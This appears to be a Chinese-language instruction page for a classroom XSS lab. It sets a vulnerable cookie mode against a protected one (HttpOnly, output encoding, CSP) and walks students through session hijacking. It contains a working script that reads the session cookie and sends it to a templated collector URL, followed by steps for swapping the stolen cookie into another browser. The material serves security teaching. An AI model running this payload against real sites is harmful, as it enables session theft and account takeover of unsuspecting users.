教學 Payload 與 Session 替換

xss_lab_session 是實際控制留言身分的 Cookie。Vulnerable 可被腳本讀取；Protected 使用 HttpOnly、輸出編碼與 CSP，切換時旋轉 Session。

<script>
const cookie = document.cookie.split('; ').find(x => x.startsWith('xss_lab_session='));
if (cookie) { new Image().src = '{{ urls.collector }}/steal?cookie=' + encodeURIComponent(cookie); }
</script>

先由兩位學生各自從入口進入 XSS；讓受害者查看此留言，Collector 會收到 Cookie。另一位學生用 F12 在自己的 XSS 主機替換 xss_lab_session 的 value，重新整理並發表留言，確認實驗身分變更。這個 Cookie 不會改變平台教師角色。
